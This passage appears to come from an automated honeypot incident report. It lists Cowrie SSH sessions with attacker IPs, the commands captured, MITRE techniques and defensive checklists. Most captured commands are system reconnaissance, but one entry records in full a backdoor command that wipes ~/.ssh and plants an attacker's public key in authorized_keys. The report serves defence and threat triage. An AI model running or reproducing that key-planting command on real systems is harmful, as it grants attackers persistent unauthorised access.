- [ ] Submit `103.251.143[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.251.143[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be679604b669

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:07 |
| **Last Seen** | 2026-08-11 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:07:33` | `cowrie.session.connect` |
| `2026-08-11 14:07:33` | `cowrie.client.version` |
| `2026-08-11 14:07:33` | `cowrie.client.kex` |
| `2026-08-11 14:07:33` | `cowrie.login.success` |
| `2026-08-11 14:07:34` | `cowrie.session.params` |
| `2026-08-11 14:07:34` | `cowrie.command.input` |
| `2026-08-11 14:07:34` | `cowrie.log.closed` |
| `2026-08-11 14:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ef5ffe2df8a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:08 |
| **Last Seen** | 2026-08-11 14:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:08:18` | `cowrie.session.connect` |
| `2026-08-11 14:08:18` | `cowrie.client.version` |
| `2026-08-11 14:08:18` | `cowrie.client.kex` |
| `2026-08-11 14:08:20` | `cowrie.login.success` |
| `2026-08-11 14:08:21` | `cowrie.session.params` |
| `2026-08-11 14:08:21` | `cowrie.command.input` |
| `2026-08-11 14:08:21` | `cowrie.command.input` |
| `2026-08-11 14:08:21` | `cowrie.command.input` |
| `2026-08-11 14:08:21` | `cowrie.command.input` |
| `2026-08-11 14:08:21` | `cowrie.command.input` |
| `2026-08-11 14:08:21` | `cowrie.command.success` |
| `2026-08-11 14:08:21` | `cowrie.command.input` |
| `2026-08-11 14:08:21` | `cowrie.command.input` |
| `2026-08-11 14:08:21` | `cowrie.command.input` |
| `2026-08-11 14:08:21` | `cowrie.command.input` |
| `2026-08-11 14:08:21` | `cowrie.log.closed` |
| `2026-08-11 14:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8943aba797cb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:09 |
| **Last Seen** | 2026-08-11 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:09:10` | `cowrie.session.connect` |
| `2026-08-11 14:09:10` | `cowrie.client.version` |
| `2026-08-11 14:09:10` | `cowrie.client.kex` |
| `2026-08-11 14:09:11` | `cowrie.login.success` |
| `2026-08-11 14:09:11` | `cowrie.session.params` |
| `2026-08-11 14:09:11` | `cowrie.command.input` |
| `2026-08-11 14:09:12` | `cowrie.log.closed` |
| `2026-08-11 14:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cb306d2d9e9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 14:09 |
| **Last Seen** | 2026-08-11 14:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:09:20` | `cowrie.session.connect` |
| `2026-08-11 14:09:20` | `cowrie.client.version` |
| `2026-08-11 14:09:20` | `cowrie.client.kex` |
| `2026-08-11 14:09:20` | `cowrie.login.success` |
| `2026-08-11 14:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3335604ac866

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 14:09 |
| **Last Seen** | 2026-08-11 14:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:09:21` | `cowrie.session.connect` |
| `2026-08-11 14:09:21` | `cowrie.client.version` |
| `2026-08-11 14:09:21` | `cowrie.client.kex` |
| `2026-08-11 14:09:21` | `cowrie.login.success` |
| `2026-08-11 14:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51666310e22b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:09 |
| **Last Seen** | 2026-08-11 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:09:37` | `cowrie.session.connect` |
| `2026-08-11 14:09:37` | `cowrie.client.version` |
| `2026-08-11 14:09:37` | `cowrie.client.kex` |
| `2026-08-11 14:09:38` | `cowrie.login.success` |
| `2026-08-11 14:09:39` | `cowrie.session.params` |
| `2026-08-11 14:09:39` | `cowrie.command.input` |
| `2026-08-11 14:09:39` | `cowrie.log.closed` |
| `2026-08-11 14:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26f2b85e0948

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:10 |
| **Last Seen** | 2026-08-11 14:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:10:00` | `cowrie.session.connect` |
| `2026-08-11 14:10:00` | `cowrie.client.version` |
| `2026-08-11 14:10:00` | `cowrie.client.kex` |
| `2026-08-11 14:10:01` | `cowrie.login.success` |
| `2026-08-11 14:10:02` | `cowrie.session.params` |
| `2026-08-11 14:10:02` | `cowrie.command.input` |
| `2026-08-11 14:10:02` | `cowrie.command.input` |
| `2026-08-11 14:10:02` | `cowrie.command.input` |
| `2026-08-11 14:10:02` | `cowrie.command.input` |
| `2026-08-11 14:10:02` | `cowrie.command.input` |
| `2026-08-11 14:10:02` | `cowrie.command.success` |
| `2026-08-11 14:10:02` | `cowrie.command.input` |
| `2026-08-11 14:10:02` | `cowrie.command.input` |
| `2026-08-11 14:10:02` | `cowrie.command.input` |
| `2026-08-11 14:10:02` | `cowrie.command.input` |
| `2026-08-11 14:10:03` | `cowrie.log.closed` |
| `2026-08-11 14:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea31abc29995

| Field | Detail |
|---|---|
| **Source IP** | `189.161.43[.]93` |
| **First Seen** | 2026-08-11 14:10 |
| **Last Seen** | 2026-08-11 14:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:10:14` | `cowrie.session.connect` |
| `2026-08-11 14:10:14` | `cowrie.client.version` |
| `2026-08-11 14:10:14` | `cowrie.client.kex` |
| `2026-08-11 14:10:15` | `cowrie.login.success` |
| `2026-08-11 14:10:16` | `cowrie.session.params` |
| `2026-08-11 14:10:16` | `cowrie.command.input` |
| `2026-08-11 14:10:16` | `cowrie.command.failed` |
| `2026-08-11 14:10:16` | `cowrie.log.closed` |
| `2026-08-11 14:10:17` | `cowrie.session.params` |
| `2026-08-11 14:10:17` | `cowrie.command.input` |
| `2026-08-11 14:10:17` | `cowrie.session.file_download` |
| `2026-08-11 14:10:17` | `cowrie.log.closed` |
| `2026-08-11 14:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.161.43[.]93` to AbuseIPDB if not already reported
- [ ] Block `189.161.43[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c22f2ee4379e

| Field | Detail |
|---|---|
| **Source IP** | `189.161.43[.]93` |
| **First Seen** | 2026-08-11 14:10 |
| **Last Seen** | 2026-08-11 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:10:17` | `cowrie.session.connect` |
| `2026-08-11 14:10:17` | `cowrie.client.version` |
| `2026-08-11 14:10:17` | `cowrie.client.kex` |
| `2026-08-11 14:10:17` | `cowrie.login.success` |
| `2026-08-11 14:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.161.43[.]93` to AbuseIPDB if not already reported
- [ ] Block `189.161.43[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5a3ff52c94f

| Field | Detail |
|---|---|
| **Source IP** | `189.161.43[.]93` |
| **First Seen** | 2026-08-11 14:10 |
| **Last Seen** | 2026-08-11 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:10:18` | `cowrie.session.connect` |
| `2026-08-11 14:10:18` | `cowrie.client.version` |
| `2026-08-11 14:10:18` | `cowrie.client.kex` |
| `2026-08-11 14:10:18` | `cowrie.login.success` |
| `2026-08-11 14:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.161.43[.]93` to AbuseIPDB if not already reported
- [ ] Block `189.161.43[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-230835e83d4f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:10 |
| **Last Seen** | 2026-08-11 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:10:51` | `cowrie.session.connect` |
| `2026-08-11 14:10:51` | `cowrie.client.version` |
| `2026-08-11 14:10:51` | `cowrie.client.kex` |
| `2026-08-11 14:10:51` | `cowrie.login.success` |
| `2026-08-11 14:10:52` | `cowrie.session.params` |
| `2026-08-11 14:10:52` | `cowrie.command.input` |
| `2026-08-11 14:10:52` | `cowrie.log.closed` |
| `2026-08-11 14:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0cdc7e8315c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:11 |
| **Last Seen** | 2026-08-11 14:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:11:43` | `cowrie.session.connect` |
| `2026-08-11 14:11:43` | `cowrie.client.version` |
| `2026-08-11 14:11:43` | `cowrie.client.kex` |
| `2026-08-11 14:11:44` | `cowrie.login.success` |
| `2026-08-11 14:11:45` | `cowrie.session.params` |
| `2026-08-11 14:11:45` | `cowrie.command.input` |
| `2026-08-11 14:11:45` | `cowrie.command.input` |
| `2026-08-11 14:11:45` | `cowrie.command.input` |
| `2026-08-11 14:11:45` | `cowrie.command.input` |
| `2026-08-11 14:11:45` | `cowrie.command.input` |
| `2026-08-11 14:11:45` | `cowrie.command.success` |
| `2026-08-11 14:11:45` | `cowrie.command.input` |
| `2026-08-11 14:11:45` | `cowrie.command.input` |
| `2026-08-11 14:11:45` | `cowrie.command.input` |
| `2026-08-11 14:11:45` | `cowrie.command.input` |
| `2026-08-11 14:11:46` | `cowrie.log.closed` |
| `2026-08-11 14:11:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61bcc9a18f74

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:12 |
| **Last Seen** | 2026-08-11 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:12:13` | `cowrie.session.connect` |
| `2026-08-11 14:12:13` | `cowrie.client.version` |
| `2026-08-11 14:12:14` | `cowrie.client.kex` |
| `2026-08-11 14:12:14` | `cowrie.login.success` |
| `2026-08-11 14:12:15` | `cowrie.session.params` |
| `2026-08-11 14:12:15` | `cowrie.command.input` |
| `2026-08-11 14:12:15` | `cowrie.log.closed` |
| `2026-08-11 14:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-608a6dd6b369

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:12 |
| **Last Seen** | 2026-08-11 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:12:35` | `cowrie.session.connect` |
| `2026-08-11 14:12:35` | `cowrie.client.version` |
| `2026-08-11 14:12:35` | `cowrie.client.kex` |
| `2026-08-11 14:12:36` | `cowrie.login.success` |
| `2026-08-11 14:12:37` | `cowrie.session.params` |
| `2026-08-11 14:12:37` | `cowrie.command.input` |
| `2026-08-11 14:12:37` | `cowrie.log.closed` |
| `2026-08-11 14:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf2f65b16240

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:13 |
| **Last Seen** | 2026-08-11 14:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:13:28` | `cowrie.session.connect` |
| `2026-08-11 14:13:28` | `cowrie.client.version` |
| `2026-08-11 14:13:28` | `cowrie.client.kex` |
| `2026-08-11 14:13:30` | `cowrie.login.success` |
| `2026-08-11 14:13:31` | `cowrie.session.params` |
| `2026-08-11 14:13:31` | `cowrie.command.input` |
| `2026-08-11 14:13:31` | `cowrie.command.input` |
| `2026-08-11 14:13:31` | `cowrie.command.input` |
| `2026-08-11 14:13:31` | `cowrie.command.input` |
| `2026-08-11 14:13:31` | `cowrie.command.input` |
| `2026-08-11 14:13:31` | `cowrie.command.success` |
| `2026-08-11 14:13:31` | `cowrie.command.input` |
| `2026-08-11 14:13:31` | `cowrie.command.input` |
| `2026-08-11 14:13:31` | `cowrie.command.input` |
| `2026-08-11 14:13:31` | `cowrie.command.input` |
| `2026-08-11 14:13:31` | `cowrie.log.closed` |
| `2026-08-11 14:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f461d6e3b14b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:14 |
| **Last Seen** | 2026-08-11 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:14:13` | `cowrie.session.connect` |
| `2026-08-11 14:14:13` | `cowrie.client.version` |
| `2026-08-11 14:14:13` | `cowrie.client.kex` |
| `2026-08-11 14:14:13` | `cowrie.login.success` |
| `2026-08-11 14:14:14` | `cowrie.session.params` |
| `2026-08-11 14:14:14` | `cowrie.command.input` |
| `2026-08-11 14:14:14` | `cowrie.log.closed` |
| `2026-08-11 14:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-842cf48b82d4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 14:14 |
| **Last Seen** | 2026-08-11 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:14:58` | `cowrie.session.connect` |
| `2026-08-11 14:14:58` | `cowrie.client.version` |
| `2026-08-11 14:14:58` | `cowrie.client.kex` |
| `2026-08-11 14:14:59` | `cowrie.login.success` |
| `2026-08-11 14:15:00` | `cowrie.session.params` |
| `2026-08-11 14:15:00` | `cowrie.command.input` |
| `2026-08-11 14:15:00` | `cowrie.log.closed` |
| `2026-08-11 14:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577bcf213ede

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 14:15 |
| **Last Seen** | 2026-08-11 14:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:15:14` | `cowrie.session.connect` |
| `2026-08-11 14:15:15` | `cowrie.client.version` |
| `2026-08-11 14:15:15` | `cowrie.client.kex` |
| `2026-08-11 14:15:16` | `cowrie.login.success` |
| `2026-08-11 14:15:17` | `cowrie.session.params` |
| `2026-08-11 14:15:17` | `cowrie.command.input` |
| `2026-08-11 14:15:17` | `cowrie.command.input` |
| `2026-08-11 14:15:17` | `cowrie.command.input` |
| `2026-08-11 14:15:17` | `cowrie.command.input` |
| `2026-08-11 14:15:17` | `cowrie.command.input` |
| `2026-08-11 14:15:17` | `cowrie.command.success` |
| `2026-08-11 14:15:17` | `cowrie.command.input` |
| `2026-08-11 14:15:17` | `cowrie.command.input` |
| `2026-08-11 14:15:17` | `cowrie.command.input` |
| `2026-08-11 14:15:17` | `cowrie.command.input` |
| `2026-08-11 14:15:18` | `cowrie.log.closed` |
| `2026-08-11 14:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2146603364e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 14:15 |
| **Last Seen** | 2026-08-11 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:15:47` | `cowrie.session.connect` |
| `2026-08-11 14:15:47` | `cowrie.client.version` |
| `2026-08-11 14:15:47` | `cowrie.client.kex` |
| `2026-08-11 14:15:48` | `cowrie.login.success` |
| `2026-08-11 14:15:49` | `cowrie.session.params` |
| `2026-08-11 14:15:49` | `cowrie.command.input` |
| `2026-08-11 14:15:49` | `cowrie.log.closed` |
| `2026-08-11 14:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-271a2ada17c2

| Field | Detail |
|---|---|
| **Source IP** | `221.229.106[.]252` |
| **First Seen** | 2026-08-11 14:16 |
| **Last Seen** | 2026-08-11 14:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 14:16:56` | `cowrie.session.connect` |
